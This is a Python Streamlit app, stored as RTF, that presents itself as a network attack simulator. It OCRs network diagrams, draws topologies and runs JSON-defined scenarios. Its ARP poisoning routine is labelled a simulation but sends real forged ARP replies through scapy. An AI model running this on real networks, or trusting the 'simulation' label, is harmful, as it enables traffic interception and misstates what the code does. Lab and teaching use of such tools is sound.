{\rtf1\ansi\ansicpg1252\cocoartf2818
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 import scapy.all as scapy\
import json\
import argparse\
import streamlit as st\
import cv2\
import pytesseract\
import networkx as nx\
import matplotlib.pyplot as plt\
\
class NetworkSimulator:\
    def __init__(self):\
        self.network = \{\}\
        self.scenarios = []\
\
    def define_network(self, config_file):\
        """Loads network topology from a JSON file."""\
        with open(config_file, 'r') as file:\
            self.network = json.load(file)\
        print("[+] Network Loaded Successfully!")\
\
    def add_scenario(self, scenario_file):\
        """Loads a new attack scenario from a JSON file."""\
        with open(scenario_file, 'r') as file:\
            scenario = json.load(file)\
        self.scenarios.append(scenario)\
        print(f"[+] Scenario '\{scenario['type']\}' added successfully!")\
\
    def execute_scenarios(self):\
        """Runs all defined attack scenarios."""\
        for scenario in self.scenarios:\
            if scenario["type"] == "ARP Poisoning":\
                self.arp_poison(scenario)\
\
    def arp_poison(self, scenario):\
        """Simulates ARP cache poisoning."""\
        attacker = scenario["attacker"]\
        fake_arp = scenario["fake_arp"]\
\
        print(f"[+] Executing ARP Poisoning by \{attacker\}...")\
        packet = scapy.ARP(op=2, psrc=fake_arp["source_IP"], hwsrc=fake_arp["source_MAC"],\
                            pdst=fake_arp["destination_IP"], hwdst=fake_arp["destination_MAC"])\
        scapy.send(packet, verbose=False)\
        print("[+] ARP Packet Sent Successfully!")\
        \
        # Log Packet Content\
        log_entry = \{\
            "ARP Operation": "Reply",\
            "Source IP": fake_arp["source_IP"],\
            "Source MAC": fake_arp["source_MAC"],\
            "Destination IP": fake_arp["destination_IP"],\
            "Destination MAC": fake_arp["destination_MAC"]\
        \}\
        print(json.dumps(log_entry, indent=4))\
\
    def process_image(self, image_path):\
        """Processes a network topology image and extracts device names and connections."""\
        image = cv2.imread(image_path)\
        gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\
        text = pytesseract.image_to_string(gray)\
        \
        # Basic processing (Assuming device names are clear and well-structured)\
        devices = [line.strip() for line in text.split('\\n') if line.strip()]\
        self.network = \{device: \{"IP": f"192.168.1.\{i+1\}", "MAC": f"AA:BB:CC:DD:EE:\{i+1:02d\}"\} for i, device in enumerate(devices)\}\
        print("[+] Extracted Network:", json.dumps(self.network, indent=4))\
        return self.network\
\
    def draw_network(self):\
        """Allows users to draw a network interactively."""\
        G = nx.Graph()\
        for device in self.network.keys():\
            G.add_node(device)\
        for connection in self.network.get("connections", []):\
            G.add_edge(connection["from"], connection["to"])\
        \
        plt.figure(figsize=(6, 6))\
        nx.draw(G, with_labels=True, node_color='lightblue', edge_color='gray', node_size=3000, font_size=10)\
        plt.show()\
\
if __name__ == "__main__":\
    st.title("Stream MILT Network Simulator")\
    uploaded_file = st.file_uploader("Upload Network Diagram (Image)", type=["png", "jpg", "jpeg"])\
    \
    simulator = NetworkSimulator()\
    if uploaded_file:\
        with open("temp_image.png", "wb") as f:\
            f.write(uploaded_file.getbuffer())\
        extracted_network = simulator.process_image("temp_image.png")\
        st.json(extracted_network)\
    \
    if st.button("Draw Network"):\
        simulator.draw_network()\
    \
    network_file = st.file_uploader("Upload Network Configuration JSON", type=["json"])\
    scenario_file = st.file_uploader("Upload Attack Scenario JSON", type=["json"])\
    \
    if network_file and scenario_file:\
        simulator.define_network(network_file.name)\
        simulator.add_scenario(scenario_file.name)\
        if st.button("Run Simulation"):\
            simulator.execute_scenarios()\
}